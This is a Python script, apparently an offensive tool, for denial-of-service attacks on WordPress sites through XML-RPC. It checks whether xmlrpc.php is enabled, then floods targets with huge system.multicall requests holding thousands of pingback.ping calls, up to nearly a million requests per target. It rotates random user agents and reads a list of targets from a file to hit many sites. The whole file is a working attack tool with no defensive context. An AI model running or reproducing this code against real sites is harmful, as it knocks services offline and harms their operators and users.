import sys
import requests
import urllib3
from random_user_agent.user_agent import UserAgent
from random_user_agent.params import SoftwareName, OperatingSystem

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class colors:
    YELLOW = '\033[33m'
    GREEN = '\033[92m'
    RED = '\033[91m'
    PURPLE = '\033[35m'
    CLEAR = '\033[0m'
    BOLD = '\033[1m'


def usage_die():
    print(
        f"\n{colors.RED}[!] Usage: python3 {sys.argv[0]} <check> <wordpress_targer>{colors.CLEAR}")
    print(
        f"{colors.RED}[!] Usage: python3 {sys.argv[0]} <attack> <pingback_URL> <wordpress_targer>{colors.CLEAR}\n")
    exit(1)


def build_entry(pingback, target):
    entry = "<value><struct><member><name>methodName</name><value>pingback.ping</value></member><member>"
    entry += f"<name>params</name><value><array><data><value>{pingback}</value>"
    entry += f"<value>{target}/?p=1</value></data></array></value></member></struct></value>"
    return entry


def build_request(pingback, target, entries):
    prefix = "<methodCall><methodName>system.multicall</methodName><params><param><array>"
    suffix = "</array></param></params></methodCall>"
    request = prefix
    for _ in range(0, entries):
        request += build_entry(pingback, target)
    request += suffix
    return request


def get_args():
    if len(sys.argv) == 1:
        usage_die()

    multiple_targets = "N"

    if sys.argv[1] == "check":
        if len(sys.argv) != 3:
            usage_die()
        else:
            action = sys.argv[1]
            target = sys.argv[2]

            if ".txt" in target:
                multiple_targets = "Y"

            return (action, "", target, 0, multiple_targets, 0)

    if sys.argv[1] == "attack":
        action = sys.argv[1]
        pingback = sys.argv[2]
        target = sys.argv[3]

        # multiple target attack - default configuration
        entries = 2000
        requests_nummber = 999999

        if ".txt" in target:
            multiple_targets = "Y"

        for i in range(len(sys.argv)):
            if sys.argv[i] == "-e":
                entries = int(sys.argv[i+1])
            elif sys.argv[i] == "-r":
                requests_nummber = int(sys.argv[i+1])

        return (action, pingback, target, entries, multiple_targets, requests_nummber)


def single_target_attack(pingback, target, entries, user_agent, requests_nummber):

    print(f"[>] Target : {colors.PURPLE}{target}{colors.CLEAR}")
    print(f"[>] Building {entries} pingback calls per one request")
    data = build_request(pingback, target, entries)
    print(f"[>] Request size: {len(data)/1000} kB")
    print(
        f"\n{colors.YELLOW}[~] Starting attack, press CTRL+C to stop ...{colors.CLEAR}")

    count = 0
    try:
        while requests_nummber:
            try:
                r = requests.post(
                    f"{target}/xmlrpc.php", data, headers={"user-agent": user_agent}, verify=False, allow_redirects=False, timeout=.2)
                if r.status_code != 200:
                    print(
                        f"\n{colors.RED}[!] Received odd status ({r.status_code}) -- DoS successful?{colors.CLEAR}\n")
            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError) as e:
                pass
            except (requests.exceptions.MissingSchema) as e:
                print(
                    f"{colors.RED}[!]{colors.CLEAR} Check supplied target address : {colors.PURPLE}{target}{colors.CLEAR}")
                break
            count += 1
            print(f"\r[>] Requests sent : {count}", end="")
            requests_nummber -= 1
    except KeyboardInterrupt:
        print(
            f"\n\n{colors.GREEN}[!] Attack interrupted by keypress{colors.CLEAR}\n")
        exit(0)
    print(f"\n\n----------------------------------------------------------------------------")


def multiple_targets_attack(pingback, targets, entries, user_agent, requests_nummber):
    for target in targets:
        single_target_attack(pingback, target, entries,
                             user_agent, requests_nummber)


def check_xmlrpc(target, user_agent):
    print(
        f"[>] Checking if XML-RPC for {colors.PURPLE}{target}{colors.CLEAR} is enabled ...")
    try:
        r = requests.get(f"{target}/xmlrpc.php", headers={"user-agent": user_agent},
                         verify=False, allow_redirects=False, timeout=5)
        if r.text == "XML-RPC server accepts POST requests only.":
            print(f"{colors.GREEN}[>] XML-RPC enabled.{colors.CLEAR}\n")
        else:
            print(f"{colors.RED}[!] XML-RPC not enabled.{colors.CLEAR}\n")
    except (requests.exceptions.Timeout, requests.exceptions.ConnectionError) as e:
        print(f"{colors.RED}[!] Connection error.{colors.CLEAR}\n")
        exit(1)
    except (requests.exceptions.MissingSchema) as e:
        print(
            f"{colors.RED}[!]{colors.CLEAR} Check supplied target address : {colors.PURPLE}{target}{colors.CLEAR}\n")
    print(f"----------------------------------------------------------------------------")


def get_random_user_agent():
    software_names = [SoftwareName.CHROME.value,
                      SoftwareName.FIREFOX.value, SoftwareName.EDGE.value]
    operating_systems = [OperatingSystem.WINDOWS.value,
                         OperatingSystem.LINUX.value]
    user_agent_rotator = UserAgent(
        software_names=software_names, operating_systems=operating_systems, limit=100)
    user_agent = user_agent_rotator.get_random_user_agent()

    return user_agent


def main():
    banner()
    action, pingback, target, entries, multiple_targets, requests_nummber = get_args()
    user_agent = get_random_user_agent()

    print(
        f"----------------------------------------------------------------------------")
    if action == "attack":
        if multiple_targets == "N":
            single_target_attack(pingback, target, entries,
                                 user_agent, requests_nummber)
        elif multiple_targets == "Y":
            with open(target, "r") as file:
                targets = file.read().splitlines()
            multiple_targets_attack(
                pingback, targets, entries, user_agent, requests_nummber)

    elif action == "check":
        if multiple_targets == "N":
            check_xmlrpc(target, user_agent)
        elif multiple_targets == "Y":
            with open(target, "r") as file:
                targets = file.read().splitlines()
            for target in targets:
                check_xmlrpc(target, user_agent)


def banner():
    print(r"""
    ▒█████   ██░ ██     ███▄ ▄███▓▓██   ██▓   ▓█████▄  ▒█████    ██████ 
    ▒██▒  ██▒▓██░ ██▒   ▓██▒▀█▀ ██▒ ▒██  ██▒   ▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
    ▒██░  ██▒▒██▀▀██░   ▓██    ▓██░  ▒██ ██░   ░██   █▌▒██░  ██▒░ ▓██▄   
    ▒██   ██░░▓█ ░██    ▒██    ▒██   ░ ▐██▓░   ░▓█▄   ▌▒██   ██░  ▒   ██▒
    ░ ████▓▒░░▓█▒░██▓   ▒██▒   ░██▒  ░ ██▒▓░   ░▒████▓ ░ ████▓▒░▒██████▒▒
    ░ ▒░▒░▒░  ▒ ░░▒░▒   ░ ▒░   ░  ░   ██▒▒▒     ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
    ░ ▒ ▒░  ▒ ░▒░ ░   ░  ░      ░ ▓██ ░▒░     ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
      ░ ░     ░  ░  ░   ░      ░    ▒ ▒         ░    ░   ░   ▒     ░  ░  
    """)


if __name__ == "__main__":
    main()
